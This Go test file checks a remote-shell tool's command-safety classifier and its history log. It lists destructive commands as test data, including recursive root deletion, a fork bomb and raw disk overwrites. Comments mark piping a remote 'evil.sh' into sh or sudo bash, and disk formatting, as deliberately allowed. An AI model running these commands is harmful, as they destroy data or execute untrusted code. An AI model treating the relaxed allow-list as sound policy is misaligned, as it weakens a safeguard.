package utils

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestCheckCommandSafetyBlocked(t *testing.T) {
	tests := []string{
		"rm -rf /",
		"rm -rf /*",
		"rm -fr /",
		"rm -rfv /*",
		"rm -rf / *",
		"rm -rf /.*",
		"echo hi && rm -rf /",
		"sudo rm -rf /",
		"rm -rf --no-preserve-root /",
		":(){ :|:& };:",
		":(){:;};:",
		"dd if=/dev/zero of=/dev/sda bs=1M",
		"dd if=/dev/zero of=/dev/nvme0n1",
		"dd of=/dev/sdb",
		"echo x > /dev/sda",
		"cat /etc/passwd > /dev/sdb",
		"echo x >> /dev/nvme0n1",
		"echo x 1>/dev/sda",
		"echo x &>/dev/sda",
		"chmod -R 777 /",
		"chmod -R 777 /*",
		"chown -R root:root /",
		"kill -9 1",
		"kill -KILL 1",
	}
	for _, cmd := range tests {
		t.Run(strings.ReplaceAll(cmd, " ", "_"), func(t *testing.T) {
			if got := CheckCommandSafety(cmd); got.Level != SafetyBlocked {
				t.Errorf("CheckCommandSafety(%q) = %v (%s), want SafetyBlocked", cmd, got.Level, got.Rule)
			}
		})
	}
}

func TestCheckCommandSafetyConfirm(t *testing.T) {
	tests := []string{
		"rm -rf /tmp/*",
		"rm -rf /var/log/",
		"rm -fr /tmp/a",
		"rm -r /opt/old",
		"rm --recursive /tmp/x",
		"shutdown -h now",
		"reboot",
		"poweroff",
		"systemctl reboot",
		"init 0",
		"init 6",
		"rm -rf /tmp/* && echo done",
	}
	for _, cmd := range tests {
		t.Run(strings.ReplaceAll(cmd, " ", "_"), func(t *testing.T) {
			if got := CheckCommandSafety(cmd); got.Level != SafetyConfirm {
				t.Errorf("CheckCommandSafety(%q) = %v (%s), want SafetyConfirm", cmd, got.Level, got.Rule)
			}
		})
	}
}

func TestCheckCommandSafetySafe(t *testing.T) {
	tests := []string{
		"uptime",
		"df -h",
		"ls -l /tmp",
		"rm -f /tmp/a.log",
		"dd if=/dev/zero of=/tmp/test.img bs=1M count=10",
		"echo hello > /dev/null",
		"grep error /var/log/messages",
		"chmod -R 755 /opt/app",
		"chown -R app:app /opt/app",
		"systemctl restart network",
		"curl http://x/data.json | jq .name",
		"python init.py",
		"kill -9 1234",
		"cat /proc/1/status",
		// 已放行：管道执行远程脚本不再硬拦截
		"curl http://x/evil.sh | sh",
		"wget -qO- http://x/evil.sh | sudo bash",
		// 已放行：磁盘格式化/分区不再需确认
		"mkfs.ext4 /dev/sdb1",
		"mkfs -t xfs /dev/sdc",
		"fdisk /dev/sdb",
		"parted /dev/sda mklabel gpt",
	}
	for _, cmd := range tests {
		t.Run(strings.ReplaceAll(cmd, " ", "_"), func(t *testing.T) {
			if got := CheckCommandSafety(cmd); got.Level != SafetySafe {
				t.Errorf("CheckCommandSafety(%q) = %v (%s), want SafetySafe", cmd, got.Level, got.Rule)
			}
		})
	}
}

func TestHostListDesc(t *testing.T) {
	hosts := []*Host{{Address: "a"}, {Address: "b"}, {Address: "c"}, {Address: "d"}}
	if got := HostListDesc(hosts); got != "[a, b, c, ...]" {
		t.Errorf("HostListDesc = %q", got)
	}
	short := hosts[:2]
	if got := HostListDesc(short); got != "[a, b]" {
		t.Errorf("HostListDesc = %q", got)
	}
	if got := HostListDesc(nil); got != "(无)" {
		t.Errorf("HostListDesc = %q", got)
	}
}

func TestBuildHistoryEntry(t *testing.T) {
	entry := BuildHistoryEntry("shell args=uptime", []string{"node-100", "node-101"}, 2, 1, 2, 0, 1500*time.Millisecond)
	if strings.Contains(entry, "\n") {
		t.Errorf("buildHistoryEntry 应返回单行 JSON，实际含换行: %q", entry)
	}
	for _, want := range []string{
		`"command"`,
		`"hosts":"node-100,node-101"`,
		`"ok":2`,
		`"failed":1`,
		`"duration_ms":1500`,
	} {
		if !strings.Contains(entry, want) {
			t.Errorf("buildHistoryEntry 缺少 %s，实际: %s", want, entry)
		}
	}
	var parsed struct {
		User string `json:"user"`
	}
	if err := json.Unmarshal([]byte(entry), &parsed); err != nil {
		t.Fatalf("buildHistoryEntry 不是合法 JSON: %v", err)
	}
	if parsed.User == "" {
		t.Errorf("buildHistoryEntry user 为空: %s", entry)
	}
}

func TestWriteHistory(t *testing.T) {
	path := filepath.Join(t.TempDir(), "history.log")
	WriteHistory(path, `{"time":"2026-01-01T00:00:00+08:00"}`)
	WriteHistory(path, `{"time":"2026-01-01T00:00:01+08:00"}`)

	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("读取执行历史日志失败: %v", err)
	}
	want := "{\"time\":\"2026-01-01T00:00:00+08:00\"}\n{\"time\":\"2026-01-01T00:00:01+08:00\"}\n"
	if string(data) != want {
		t.Errorf("WriteHistory 追加内容不符，got %q want %q", string(data), want)
	}
	info, err := os.Stat(path)
	if err != nil {
		t.Fatalf("stat 执行历史日志失败: %v", err)
	}
	if perm := info.Mode().Perm(); perm != 0o600 {
		t.Errorf("WriteHistory 文件权限 = %o, want 600", perm)
	}
}
